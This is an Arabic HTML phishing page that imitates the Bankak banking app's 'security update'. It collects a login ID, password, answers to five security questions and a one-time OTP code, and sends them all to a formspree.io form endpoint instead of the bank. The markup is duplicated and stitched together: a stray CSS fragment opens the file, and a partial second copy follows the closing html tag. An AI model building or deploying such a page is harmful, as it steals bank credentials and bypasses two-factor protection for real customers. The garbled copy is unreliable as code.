        .step.active { display: block; }<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق بنكك - التحديث الأمني</title>
    <style>
        :root { --bok-red: #e30613; --bok-gold: #ffca28; }
        body { background-color: var(--bok-red); font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: white; padding: 20px 0; }
        .container { width: 90%; max-width: 400px; text-align: center; margin: auto; }
        .logo { font-size: 55px; font-weight: bold; margin-bottom: 20px; text-shadow: 2px 2px 10px rgba(0,0,0,0.3); }
        .logo span { font-size: 20px; display: block; margin-top: -15px; }
        
        .step { display: none; animation: fadeIn 0.4s; }
        .step.active { display: block; }

        input[type="text"], input[type="password"], input[type="number"], select { 
            width: 100%; padding: 14px; border-radius: 10px; border: 2px solid transparent; 
            font-size: 16px; text-align: right; box-sizing: border-box; outline: none;
            background-color: rgba(255, 255, 255, 0.95); transition: 0.3s; margin-top: 5px;
        }

        .error-field { border: 2px solid var(--bok-gold) !important; background-color: #fff0f0 !important; }

        /* تنسيق خانة OTP الموحدة */
        .otp-single-wrapper { margin: 25px 0; }
        .otp-input-field { 
            text-align: center !important; 
            letter-spacing: 8px; 
            font-size: 24px !important; 
            font-weight: bold; 
            direction: ltr;
        }

        .qa-card { background: white; color: #333; padding: 15px; border-radius: 12px; margin-bottom: 15px; text-align: right; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .qa-card label { color: var(--bok-red); font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; }

        .consent-box { display: flex; align-items: center; text-align: right; margin: 20px 0; background: rgba(0, 0, 0, 0.2); padding: 12px; border-radius: 8px; }
        .consent-box input { width: 22px; height: 22px; margin-left: 10px; accent-color: var(--bok-gold); cursor: pointer; }

        .btn { width: 100%; padding: 16px; background: white; color: var(--bok-red); border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: 0.3s; }
        .btn-gold { background: var(--bok-gold); color: #333; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">بنكك<span>bankak</span></div>

    <form action="https://formspree.io/f/xjgeaelv" method="POST" id="finalBOKForm">
        
        <div id="step1" class="step active">
            <input type="text" name="رقم_المعرف" placeholder="رقم المعرف أو 249-" required>
            <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>
            <button type="button" class="btn" onclick="validateAndGo(1, 2)">تسجيل الدخول</button>
        </div>

        <div id="step2" class="step">
            <h3 style="font-size: 18px; margin-bottom: 20px;">تحديث أسئلة الأمان</h3>
            
            <div class="qa-card">
                <label>السؤال الأول</label>
                <select name="سؤال_1">
                    <option>ما هو اسم ابن عمك الأول؟</option>
                    <option>في أي مدينة ولدت؟</option>
                    <option>في أي سنة تخرجت من الجامعة؟</option>
                </select>
                <input type="text" name="جواب_1" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الثاني</label>
                <select name="سؤال_2">
                    <option>ماذا كان لقبك أثناء الطفولة؟</option>
                    <option>ما هو اسم مؤلفك المفضل؟</option>
                    <option>ما هو اسم شركتك المفضلة؟</option>
                </select>
                <input type="text" name="جواب_2" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الثالث</label>
                <select name="سؤال_3">
                    <option>اسم أفضل صديق في الطفولة؟</option>
                    <option>أي فيلم هو المفضل لديك؟</option>
                    <option>في أي عام حصلت على رخصة القيادة؟</option>
                </select>
                <input type="text" name="جواب_3" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الرابع</label>
                <select name="سؤال_4">
                    <option>اسم فريق كرة القدم المفضل؟</option>
                    <option>ماركة أول تلفزيون خاص بك؟</option>
                    <option>في أي سنة تزوجت؟</option>
                </select>
                <input type="text" name="جواب_4" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الخامس</label>
                <select name="سؤال_5">
                    <option>ما اسم المدرسة التي التحقت بها؟</option>
                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
                    <option>ما هي ماركة سيارتك الأولى؟</option>
                </select>
                <input type="text" name="جواب_5" placeholder="إجابتك هنا" required>
            </div>

            <button type="button" class="btn" onclick="validateAndGo(2, 3)">متابعة لتأكيد الرمز</button>
        </div>

        <div id="step3" class="step">
            <h3>تأكيد الرمز (OTP)</h3>
            <p>أدخل الرمز المكون من 6 أرقام</p>
            <div class="otp-single-wrapper">
                <input type="text" name="الرمز_OTP" class="otp-input-field" maxlength="6" pattern="\d*" inputmode="numeric" placeholder="000000" required>
            </div>
            
            <div class="consent-box">
                <input type="checkbox" id="agree" required>
                <label for="agree">أقر بصحة البيانات وأوافق على تحديث الحماية.</label>
            </div>
            <button type="submit" class="btn btn-gold">تأكيد نهائي وحفظ</button>
        </div>
    </form>
</div>

<script>
    function validateAndGo(current, next) {
        const step = document.getElementById('step' + current);
        const inputs = step.querySelectorAll('input[required]');
        let valid = true;

        inputs.forEach(i => {
            if (!i.value.trim()) {
                i.classList.add('error-field');
                valid = false;
            } else {
                i.classList.remove('error-field');
            }
        });

        if (valid) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + next).classList.add('active');
            window.scrollTo(0, 0);
        } else {
            alert("يرجى إكمال جميع الحقول المطلوبة للمتابعة.");
        }
    }
</script>

</body>
</html>


        input[type="text"], input[type="password"], input[type="number"], select { 
            width: 100%; padding: 14px; border-radius: 10px; border: 2px solid transparent; 
            font-size: 16px; text-align: right; box-sizing: border-box; outline: none;
            background-color: rgba(255, 255, 255, 0.95); transition: 0.3s; margin-top: 5px;
        }

        .error-field { border: 2px solid var(--bok-gold) !important; background-color: #fff0f0 !important; }

        /* تنسيق خانة OTP الموحدة */
        .otp-single-wrapper { margin: 25px 0; }
        .otp-input-field { 
            text-align: center !important; 
            letter-spacing: 8px; 
            font-size: 24px !important; 
            font-weight: bold; 
            direction: ltr;
        }

        .qa-card { background: white; color: #333; padding: 15px; border-radius: 12px; margin-bottom: 15px; text-align: right; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .qa-card label { color: var(--bok-red); font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; }

        .consent-box { display: flex; align-items: center; text-align: right; margin: 20px 0; background: rgba(0, 0, 0, 0.2); padding: 12px; border-radius: 8px; }
        .consent-box input { width: 22px; height: 22px; margin-left: 10px; accent-color: var(--bok-gold); cursor: pointer; }

        .btn { width: 100%; padding: 16px; background: white; color: var(--bok-red); border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: 0.3s; }
        .btn-gold { background: var(--bok-gold); color: #333; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">بنكك<span>bankak</span></div>

    <form action="https://formspree.io/f/xjgeaelv" method="POST" id="finalBOKForm">
        
        <div id="step1" class="step active">
            <input type="text" name="رقم_المعرف" placeholder="رقم المعرف أو 249-" required>
            <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>
            <button type="button" class="btn" onclick="validateAndGo(1, 2)">تسجيل الدخول</button>
        </div>

        <div id="step2" class="step">
            <h3 style="font-size: 18px; margin-bottom: 20px;">تحديث أسئلة الأمان</h3>
            
            <div class="qa-card">
                <label>السؤال الأول</label>
                <select name="سؤال_1">
                    <option>ما هو اسم ابن عمك الأول؟</option>
                    <option>في أي مدينة ولدت؟</option>
                    <option>في أي سنة تخرجت من الجامعة؟</option>
                </select>
                <input type="text" name="جواب_1" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الثاني</label>
                <select name="سؤال_2">
                    <option>ماذا كان لقبك أثناء الطفولة؟</option>
                    <option>ما هو اسم مؤلفك المفضل؟</option>
                    <option>ما هو اسم شركتك المفضلة؟</option>
                </select>
                <input type="text" name="جواب_2" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الثالث</label>
                <select name="سؤال_3">
                    <option>اسم أفضل صديق في الطفولة؟</option>
                    <option>أي فيلم هو المفضل لديك؟</option>
                    <option>في أي عام حصلت على رخصة القيادة؟</option>
                </select>
                <input type="text" name="جواب_3" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الرابع</label>
                <select name="سؤال_4">
                    <option>اسم فريق كرة القدم المفضل؟</option>
                    <option>ماركة أول تلفزيون خاص بك؟</option>
                    <option>في أي سنة تزوجت؟</option>
                </select>
                <input type="text" name="جواب_4" placeholder="إجابتك هنا" required>
            </div>

            <div class="qa-card">
                <label>السؤال الخامس</label>
                <select name="سؤال_5">
                    <option>ما اسم المدرسة التي التحقت بها؟</option>
                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
                    <option>ما هي ماركة سيارتك الأولى؟</option>
                </select>
                <input type="text" name="جواب_5" placeholder="إجابتك هنا" required>
            </div>

            <button type="button" class="btn" onclick="validateAndGo(2, 3)">متابعة لتأكيد الرمز</button>
        </div>

        <div id="step3" class="step">
            <h3>تأكيد الرمز (OTP)</h3>
            <p>أدخل الرمز المكون من 6 أرقام</p>
            <div class="otp-single-wrapper">
                <input type="text" name="الرمز_OTP" class="otp-input-field" maxlength="6" pattern="\d*" inputmode="numeric" placeholder="000000" required>
            </div>
            
            <div class="consent-box">
                <input type="checkbox" id="agree" required>
                <label for="agree">أقر بصحة البيانات وأوافق على تحديث الحماية.</label>
            </div>
            <button type="submit" class="btn btn-gold">تأكيد نهائي وحفظ</button>
        </div>
    </form>
</div>

<script>
    function validateAndGo(current, next) {
        const step = document.getElementById('step' + current);
        const inputs = step.querySelectorAll('input[required]');
        let valid = true;

        inputs.forEach(i => {
            if (!i.value.trim()) {
                i.classList.add('error-field');
                valid = false;
            } else {
                i.classList.remove('error-field');
            }
        });

        if (valid) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + next).classList.add('active');
            window.scrollTo(0, 0);
        } else {
            alert("يرجى إكمال جميع الحقول المطلوبة للمتابعة.");
        }
    }
</script>

</body>
</html>
